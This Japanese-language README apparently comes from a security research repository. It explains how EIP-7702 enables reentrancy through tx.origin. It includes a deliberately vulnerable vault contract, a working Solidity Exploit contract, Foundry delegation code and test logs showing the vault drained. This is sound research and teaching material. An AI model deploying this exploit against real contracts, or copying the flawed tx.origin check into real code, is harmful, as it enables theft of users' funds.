# Notes on tx.origin Reentrancy Attacks

**目次**
- [概要](#概要)
- [PoC](#poc)
- [Appendix: EIP-7702 関連の脆弱性の分析一覧](#appendix-eip-7702-関連の脆弱性の分析一覧)

## 概要
- 2025年5月に行われたPectraアップグレードで [EIP-7702](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-7702.md) が導入されたことで `tx.origin` から Reentrancy Attack が可能になった。
- EIP-7702 は、簡単に言えば「Externally Owned Account (EOA) に Ethereum Virtual Machine (EVM) バイトコードをセットするための仕様」。
    - 従来 EOA 上のコンテキストで、EVM バイトコードの実行はできない仕様だった。
    - EIP-7702 により、EOA がコントラクトのように振る舞うことができ、例えば「EOA に Ether が送金されたら `fallback` 関数でそれを別のアドレスにそのまま送金する」なんてことができる。
- EIP-7702 が導入されたことで様々なメリットがある一方で、「`tx.origin` は EOA であるから、 `tx.origin` が Reentrancy Attack を実行することはない」という前提が当たり前に崩れる。
    - Reentrancy Attack は [Checks-Effects-Interactionsパターン](https://github.com/minaminao/seccamp/tree/main/course/reentrancy) (CEI) に従い状態の整合が取れていれば被害を受けることがないが、一部のコントラクトでは不十分な対策が取られている。
        - 補足: Reentrancy Guard は Cross-Contract Reentrancy Attack に脆弱。
    - 特に EIP-7702 導入以前では、EOA から Reentrancy Attack を行うことは不可能であったため、この性質を利用して、例えば `require(tx.origin == msg.sender)` を Reentrancy Attack への対策としているコントラクトがあった。
        - `require(tx.origin == msg.sender)` を使用しているコントラクトは最近はほぼ見ないが、一昔前のコントラクトではよく使われていた。参考: [GitHub での検索](https://github.com/search?q=%22tx.origin+%3D%3D+msg.sender%22+language%3ASolidity&type=code)。
    - この例のように、 EIP-7702 で影響を受ける可能性があるケースは、CEI に従わずに `tx.origin` への送金（より一般にコントラクトコール）をしている場合である。
    - 従来 EIP-7702 が無いことで見逃されていた特殊な攻撃条件が成立する可能性がある。
- 当然、影響を受けるコントラクトを Ethereum Foundation や調査機関が調べ上げて EIP-7702 が導入されているため、ほぼほぼ安全であるとは考えられている。実際現時点で Ethereum メインネットで、この脆弱性が悪用されて被害が出たケースは私が知る限りは無い（BSC 等他のチェーンでは攻撃が報告されている）。
- 一方で、過去デプロイされた全てのコントラクトを調査できているわけではないのが事実であり、潜在的に影響を受けるコントラクトがゼロであると言い切ることは不可能。
    - 調査例: [Dedaub による関連仕様 EIP-3074 の影響調査](https://dedaub.com/audits/ethereum-foundation/ef-eip-3074-impact-study-may-19-2021/)。
    - まだ `tx.origin == msg.sender` で検索したコントラクトを地道にマニュアルレビューする程度であれば可能ではあるが、極端な話、ソースコードが検証されていないコントラクトに対してはバイトコードレベルでの調査を要するため現実的に困難（とはいえ、多くのユーザーが利用するプロトコルであれば、基本的にソースコードが公開されているので大きな問題にはならない）。

## PoC

例えば、以下のとてもシンプルなVaultコントラクトについて考える:

```solidity
contract SimpleVault {
    mapping(address => uint256) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        require(tx.origin == msg.sender);
        require(balanceOf[msg.sender] > 0);
        (bool success,) = msg.sender.call{value: balanceOf[msg.sender]}("");
        require(success);
        balanceOf[msg.sender] = 0;
    }
}
```

仮に `require(tx.origin == msg.sender);` が無ければ以下のコントラクトで典型的な Reentrancy Attack が可能で、デポジットされた他のユーザーの資金を全て引き出せる:

```solidity
contract Exploit {
    SimpleVault simpleVault;
    uint256 step = 0;

    function exploit(address simpleVaultAddr) external payable {
        simpleVault = SimpleVault(simpleVaultAddr);
        for (uint256 i = 0; i < 20; i++) {
            uint256 value = address(simpleVault).balance < address(this).balance
                ? address(simpleVault).balance
                : address(this).balance;
            if (value == 0) {
                break;
            }
            simpleVault.deposit{value: value}();
            simpleVault.withdrawAll();
        }
    }

    receive() external payable {
        if (step == 0) {
            step = 1;
            simpleVault.withdrawAll();
        } else {
            step = 0;
        }
    }
}
```

補足: 効率的に全額引き出すために倍々に引き出す額を上げている。

`require(tx.origin == msg.sender);` があるので、以下のように `Exploit` コントラクトのバイトコードを攻撃者の EOA にセットしてから自身の `exploit` 関数を呼び出す:

```solidity
Exploit exploit = new Exploit();
vm.signAndAttachDelegation(address(exploit), attackerPrivateKey);
Exploit(payable(attackerAddr)).exploit{value: 1 ether}(address(simpleVault));
```

Foundry では `vm.signAndAttachDelegation` を用いて、EOA にバイトコードを設定できる（ref: [docs](https://getfoundry.sh/reference/cheatcodes/sign-delegation/)）。
厳密には既にデプロイ済みのコントラクトに実行を委任している。

注意点として、初期化コードは EOA のコンテキストでは実行されないので、もし `Exploit` のコンストラクタを実装しても委任時には実行されない。
そのため、先程の `Exploit` コントラクトでは、コンストラクタに `simpleVault` のアドレスを渡さず、 `exploit` 関数実行時に渡している。

このリポジトリ配下で以下のコマンドを実行すると、攻撃が成功することを確認できる:

```
$ forge test -vv
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.30
[⠔] Solc 0.8.30 finished in 376.34ms
Compiler run successful!

Ran 1 test for test/Exploit.t.sol:ExploitTest
[PASS] test_Exploit() (gas: 962560)
Logs:
  before the attack:
    attacker balance: 1.000000000000000000
    vault balance: 10000.000000000000000000
  after the attack:
    attacker balance: 10001.000000000000000000
    vault balance: 0.000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.63ms (1.16ms CPU time)

Ran 1 test suite in 102.14ms (1.63ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

セットアップ後 `SimpleVault` コントラクトには 10,000 ether があり、攻撃後は 0 ether になっている。

## Appendix: EIP-7702 関連の脆弱性の分析一覧
- [2025-08-25 BSC の unknown コントラクトでの被害](./src/20250825_BscUnknown)
